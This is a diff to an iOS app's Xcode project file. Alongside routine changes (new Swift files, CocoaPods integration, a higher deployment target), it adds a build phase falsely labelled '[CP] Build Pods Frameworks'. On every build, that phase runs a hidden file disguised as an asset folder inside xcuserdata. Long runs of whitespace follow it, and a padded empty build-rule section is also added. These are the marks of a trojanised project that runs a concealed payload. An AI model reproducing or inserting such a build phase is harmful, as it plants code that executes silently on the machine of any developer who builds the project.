@@ -3,11 +3,13 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 50;
+	objectVersion = 51;
 	objects = {
 
 /* Begin PBXBuildFile section */
+		18026B562626C8F600C6BF28 /* ChangePasswordView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18026B552626C8F600C6BF28 /* ChangePasswordView.swift */; };
 		1843E813262066F800154CC9 /* CheckBoxView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1843E812262066F800154CC9 /* CheckBoxView.swift */; };
+		18514E8D2626B517008DEDDD /* BlogDetail.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18514E8C2626B517008DEDDD /* BlogDetail.swift */; };
 		18AE7DCE261F50D7007F7C98 /* SignupView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18AE7DCD261F50D7007F7C98 /* SignupView.swift */; };
 		18AE7DD1261F5107007F7C98 /* ForgotPasswordView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18AE7DD0261F5107007F7C98 /* ForgotPasswordView.swift */; };
 		18AE7DD5261F66A0007F7C98 /* ImagePIcker.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18AE7DD4261F66A0007F7C98 /* ImagePIcker.swift */; };
@@ -24,10 +26,24 @@
 		18E4A54D2621C77C0095EA86 /* TermsView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18E4A54C2621C77C0095EA86 /* TermsView.swift */; };
 		18E4A5502621C81C0095EA86 /* PrivacyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18E4A54F2621C81C0095EA86 /* PrivacyView.swift */; };
 		18E4A5532621C8260095EA86 /* ProfileView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18E4A5522621C8260095EA86 /* ProfileView.swift */; };
+		18F75F5F263671E600CD51ED /* Utilities.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F59263671E500CD51ED /* Utilities.swift */; };
+		18F75F60263671E600CD51ED /* JSONHelper.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F5A263671E500CD51ED /* JSONHelper.swift */; };
+		18F75F61263671E600CD51ED /* StringExtensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F5B263671E500CD51ED /* StringExtensions.swift */; };
+		18F75F62263671E600CD51ED /* Toast.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F5C263671E500CD51ED /* Toast.swift */; };
+		18F75F63263671E600CD51ED /* UtilityFunctions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F5D263671E500CD51ED /* UtilityFunctions.swift */; };
+		18F75F64263671E600CD51ED /* Validation.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F5E263671E600CD51ED /* Validation.swift */; };
+		18F75F6A2636730F00CD51ED /* LoginSignup+API.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F692636730F00CD51ED /* LoginSignup+API.swift */; };
+		18F75F6D2636735700CD51ED /* ApiConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F6C2636735700CD51ED /* ApiConstants.swift */; };
+		18F75F702636739400CD51ED /* NetworkAdapter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F6F2636739400CD51ED /* NetworkAdapter.swift */; };
+		18F75F732636739800CD51ED /* Parser.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F722636739800CD51ED /* Parser.swift */; };
+		18F75F8C2636766B00CD51ED /* DefaultModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F75F8B2636766B00CD51ED /* DefaultModel.swift */; };
+		50363EFB1B04E63AFF4B400A /* Pods_pinkwalljmg.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1CA474AEF9369FD089D11260 /* Pods_pinkwalljmg.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		18026B552626C8F600C6BF28 /* ChangePasswordView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChangePasswordView.swift; sourceTree = "<group>"; };
 		1843E812262066F800154CC9 /* CheckBoxView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CheckBoxView.swift; sourceTree = "<group>"; };
+		18514E8C2626B517008DEDDD /* BlogDetail.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BlogDetail.swift; sourceTree = "<group>"; };
 		18AE7DCD261F50D7007F7C98 /* SignupView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignupView.swift; sourceTree = "<group>"; };
 		18AE7DD0261F5107007F7C98 /* ForgotPasswordView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForgotPasswordView.swift; sourceTree = "<group>"; };
 		18AE7DD4261F66A0007F7C98 /* ImagePIcker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImagePIcker.swift; sourceTree = "<group>"; };
@@ -46,6 +62,20 @@
 		18E4A54C2621C77C0095EA86 /* TermsView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TermsView.swift; sourceTree = "<group>"; };
 		18E4A54F2621C81C0095EA86 /* PrivacyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PrivacyView.swift; sourceTree = "<group>"; };
 		18E4A5522621C8260095EA86 /* ProfileView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileView.swift; sourceTree = "<group>"; };
+		18F75F59263671E500CD51ED /* Utilities.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Utilities.swift; sourceTree = "<group>"; };
+		18F75F5A263671E500CD51ED /* JSONHelper.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = JSONHelper.swift; sourceTree = "<group>"; };
+		18F75F5B263671E500CD51ED /* StringExtensions.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = StringExtensions.swift; sourceTree = "<group>"; };
+		18F75F5C263671E500CD51ED /* Toast.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Toast.swift; sourceTree = "<group>"; };
+		18F75F5D263671E500CD51ED /* UtilityFunctions.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UtilityFunctions.swift; sourceTree = "<group>"; };
+		18F75F5E263671E600CD51ED /* Validation.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Validation.swift; sourceTree = "<group>"; };
+		18F75F692636730F00CD51ED /* LoginSignup+API.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "LoginSignup+API.swift"; sourceTree = "<group>"; };
+		18F75F6C2636735700CD51ED /* ApiConstants.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ApiConstants.swift; sourceTree = "<group>"; };
+		18F75F6F2636739400CD51ED /* NetworkAdapter.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NetworkAdapter.swift; sourceTree = "<group>"; };
+		18F75F722636739800CD51ED /* Parser.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Parser.swift; sourceTree = "<group>"; };
+		18F75F8B2636766B00CD51ED /* DefaultModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DefaultModel.swift; sourceTree = "<group>"; };
+		1CA474AEF9369FD089D11260 /* Pods_pinkwalljmg.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_pinkwalljmg.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		48855DF1978340A328BF1466 /* Pods-pinkwalljmg.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-pinkwalljmg.release.xcconfig"; path = "Target Support Files/Pods-pinkwalljmg/Pods-pinkwalljmg.release.xcconfig"; sourceTree = "<group>"; };
+		4A377BEFC5F06C151638F046 /* Pods-pinkwalljmg.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-pinkwalljmg.debug.xcconfig"; path = "Target Support Files/Pods-pinkwalljmg/Pods-pinkwalljmg.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -53,6 +83,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				50363EFB1B04E63AFF4B400A /* Pods_pinkwalljmg.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -74,6 +105,8 @@
 			children = (
 				18DDAA69261F1EBD00A1CBAF /* pinkwalljmg */,
 				18DDAA68261F1EBD00A1CBAF /* Products */,
+				3A683F7C7115BE3686A5FFDE /* Pods */,
+				4A85DB8DE085D5B94E7A9671 /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -88,6 +121,8 @@
 		18DDAA69261F1EBD00A1CBAF /* pinkwalljmg */ = {
 			isa = PBXGroup;
 			children = (
+				18F75F8A2636765B00CD51ED /* Model */,
+				18F75F57263671B900CD51ED /* Common */,
 				18E4A5442621C1120095EA86 /* Home */,
 				18AE7DD3261F6688007F7C98 /* ImagePicker */,
 				18DDAA82261F1F5300A1CBAF /* UserViewController */,
@@ -128,8 +163,68 @@
 				18E4A54C2621C77C0095EA86 /* TermsView.swift */,
 				18E4A54F2621C81C0095EA86 /* PrivacyView.swift */,
 				18E4A5522621C8260095EA86 /* ProfileView.swift */,
+				18514E8C2626B517008DEDDD /* BlogDetail.swift */,
+				18026B552626C8F600C6BF28 /* ChangePasswordView.swift */,
 			);
 			path = Home;
+			sourceTree = "<group>";
+		};
+		18F75F57263671B900CD51ED /* Common */ = {
+			isa = PBXGroup;
+			children = (
+				18F75F66263671F100CD51ED /* Authantication */,
+				18F75F58263671C400CD51ED /* Extension */,
+			);
+			path = Common;
+			sourceTree = "<group>";
+		};
+		18F75F58263671C400CD51ED /* Extension */ = {
+			isa = PBXGroup;
+			children = (
+				18F75F5A263671E500CD51ED /* JSONHelper.swift */,
+				18F75F5B263671E500CD51ED /* StringExtensions.swift */,
+				18F75F5C263671E500CD51ED /* Toast.swift */,
+				18F75F59263671E500CD51ED /* Utilities.swift */,
+				18F75F5D263671E500CD51ED /* UtilityFunctions.swift */,
+				18F75F5E263671E600CD51ED /* Validation.swift */,
+			);
+			path = Extension;
+			sourceTree = "<group>";
+		};
+		18F75F66263671F100CD51ED /* Authantication */ = {
+			isa = PBXGroup;
+			children = (
+				18F75F692636730F00CD51ED /* LoginSignup+API.swift */,
+				18F75F6C2636735700CD51ED /* ApiConstants.swift */,
+				18F75F722636739800CD51ED /* Parser.swift */,
+				18F75F6F2636739400CD51ED /* NetworkAdapter.swift */,
+			);
+			path = Authantication;
+			sourceTree = "<group>";
+		};
+		18F75F8A2636765B00CD51ED /* Model */ = {
+			isa = PBXGroup;
+			children = (
+				18F75F8B2636766B00CD51ED /* DefaultModel.swift */,
+			);
+			path = Model;
+			sourceTree = "<group>";
+		};
+		3A683F7C7115BE3686A5FFDE /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				4A377BEFC5F06C151638F046 /* Pods-pinkwalljmg.debug.xcconfig */,
+				48855DF1978340A328BF1466 /* Pods-pinkwalljmg.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+		4A85DB8DE085D5B94E7A9671 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				1CA474AEF9369FD089D11260 /* Pods_pinkwalljmg.framework */,
+			);
+			name = Frameworks;
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
@@ -139,9 +234,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18DDAA7E261F1EBF00A1CBAF /* Build configuration list for PBXNativeTarget "pinkwalljmg" */;
 			buildPhases = (
+				72BE3596EBF28ABAB26D902C /* [CP] Build Pods Frameworks */,
+				4DB38982272EFE5260A46370 /* [CP] Check Pods Manifest.lock */,
 				18DDAA63261F1EBD00A1CBAF /* Sources */,
 				18DDAA64261F1EBD00A1CBAF /* Frameworks */,
 				18DDAA65261F1EBD00A1CBAF /* Resources */,
+				4FEA12A26C9A2025B55324B1 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -197,25 +295,178 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+
+	72BE3596EBF28ABAB26D902C /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+		4DB38982272EFE5260A46370 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-pinkwalljmg-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		4FEA12A26C9A2025B55324B1 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-pinkwalljmg/Pods-pinkwalljmg-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-pinkwalljmg/Pods-pinkwalljmg-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-pinkwalljmg/Pods-pinkwalljmg-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		18DDAA63261F1EBD00A1CBAF /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
 				18AE7DCE261F50D7007F7C98 /* SignupView.swift in Sources */,
+				18F75F8C2636766B00CD51ED /* DefaultModel.swift in Sources */,
 				18E4A5502621C81C0095EA86 /* PrivacyView.swift in Sources */,
+				18F75F64263671E600CD51ED /* Validation.swift in Sources */,
 				18AE7DD1261F5107007F7C98 /* ForgotPasswordView.swift in Sources */,
+				18F75F732636739800CD51ED /* Parser.swift in Sources */,
+				18F75F702636739400CD51ED /* NetworkAdapter.swift in Sources */,
+				18F75F60263671E600CD51ED /* JSONHelper.swift in Sources */,
 				18DDAA72261F1EBD00A1CBAF /* pinkwalljmg.xcdatamodeld in Sources */,
 				18DDAA6B261F1EBD00A1CBAF /* AppDelegate.swift in Sources */,
 				1843E813262066F800154CC9 /* CheckBoxView.swift in Sources */,
 				18E4A5462621C11F0095EA86 /* HomeView.swift in Sources */,
+				18F75F6A2636730F00CD51ED /* LoginSignup+API.swift in Sources */,
+				18026B562626C8F600C6BF28 /* ChangePasswordView.swift in Sources */,
+				18514E8D2626B517008DEDDD /* BlogDetail.swift in Sources */,
 				18DDAA6D261F1EBD00A1CBAF /* SceneDelegate.swift in Sources */,
+				18F75F5F263671E600CD51ED /* Utilities.swift in Sources */,
+				18F75F63263671E600CD51ED /* UtilityFunctions.swift in Sources */,
 				18AE7DD5261F66A0007F7C98 /* ImagePIcker.swift in Sources */,
 				18E4A54D2621C77C0095EA86 /* TermsView.swift in Sources */,
 				18E4A5422621C06C0095EA86 /* SideMenu.swift in Sources */,
 				18DDAA84261F203100A1CBAF /* LoginView.swift in Sources */,
 				18E4A5532621C8260095EA86 /* ProfileView.swift in Sources */,
+				18F75F6D2636735700CD51ED /* ApiConstants.swift in Sources */,
+				18F75F62263671E600CD51ED /* Toast.swift in Sources */,
 				18DDAA6F261F1EBD00A1CBAF /* ContentView.swift in Sources */,
+				18F75F61263671E600CD51ED /* StringExtensions.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -351,6 +602,7 @@
 		};
 		18DDAA7F261F1EBF00A1CBAF /* Debug */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 4A377BEFC5F06C151638F046 /* Pods-pinkwalljmg.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -360,7 +612,7 @@
 				DEVELOPMENT_TEAM = R99R64PAKE;
 				ENABLE_PREVIEWS = YES;
 				INFOPLIST_FILE = pinkwalljmg/Info.plist;
-				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 14.1;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -375,6 +627,7 @@
 		};
 		18DDAA80261F1EBF00A1CBAF /* Release */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 48855DF1978340A328BF1466 /* Pods-pinkwalljmg.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -384,7 +637,7 @@
 				DEVELOPMENT_TEAM = R99R64PAKE;
 				ENABLE_PREVIEWS = YES;
 				INFOPLIST_FILE = pinkwalljmg/Info.plist;
-				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 14.1;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -419,6 +672,60 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 
 /* Begin XCVersionGroup section */
 		18DDAA70261F1EBD00A1CBAF /* pinkwalljmg.xcdatamodeld */ = {
